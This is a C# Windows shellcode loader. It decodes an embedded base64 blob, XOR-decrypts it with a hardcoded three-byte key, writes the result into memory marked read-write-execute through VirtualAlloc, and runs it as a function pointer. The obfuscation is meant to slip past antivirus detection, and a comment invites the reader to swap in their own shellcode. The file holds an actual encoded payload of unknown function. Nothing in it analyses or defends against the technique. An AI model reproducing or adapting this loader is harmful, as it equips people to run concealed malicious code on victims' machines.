using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace ShellcodeLoader
{
    class ShellcodeLoader
    {
        static byte[] XOR(byte[] inputBytes, byte[] keyBytes)
        {
            // Create a new byte array to store the encrypted data
            byte[] encryptedBytes = new byte[inputBytes.Length];

            // Apply XOR operation to each byte in inputBytes using corresponding byte in keyBytes
            for (int i = 0; i < inputBytes.Length; i++)
            {
                encryptedBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return encryptedBytes;
        }
        static void Main(string[] args)
        {
            // Replace the following with your shellcode

            // base64 of xored shellcode
            string base64String = "VyVgq83vy0QKmh+LIJ/fIJ/jIJ/7IL/HmjLgHIfJmg1Dl6yTqeHPagLiqgqm3iK9IJ///Eatl8w/II2XLg2b58w/IJXP+8w8IIX3LgSbl4Rkn0beVMw5mg1DagLiqgrXS7gbqLAXkLDL3i23IJXLqh6JIMGkIJXzqh5kr0bue0Srj+m08Ky28ZwQS5Ww8Ub9Qk0QVDKyw/7dq82H3L7d9JmH57rJrEQHVB1XO8zvq+Qr/52Hgk2EqzI6wceHa2XAKaXtq+7GIiu/+52/652v+6UFpBIPVBh4wd25/KV2DrmOVBhqa7nlVIPn3iEHzM3vq6fvwcm5/KXtcgWwVBhsU82RnUbZwY2Hq93vq5uFq6W3D54KVBh8+Kfv/Z64w882Y5IQfk4Xq7DH86Xv683vwc2/w8bApP0QfpqH3qOiyjI69ZMQp+ngLr0QVDIGMDIQVMwsgguaag5UW3hN/afv+DI6";
            
            // Base64 decode
            byte[] shellcode = Convert.FromBase64String(base64String);

            // Xor Decrypt
            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };
            byte[] decryptedBytes = XOR(shellcode, keyBytes);
            
            // Allocate memory for the shellcode
            IntPtr ptr = VirtualAlloc(IntPtr.Zero, decryptedBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // Copy the shellcode to the allocated memory
            Marshal.Copy(decryptedBytes, 0, ptr, decryptedBytes.Length);

            // Execute the shellcode
            ((Action)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Action)))();

            // Free the allocated memory
            VirtualFree(ptr, decryptedBytes.Length, MEM_RELEASE);
        }

        // Constants for memory allocation
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint MEM_RELEASE = 0x8000;

        // Import the necessary WinAPI functions
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, int dwSize, uint dwFreeType);
    }
}
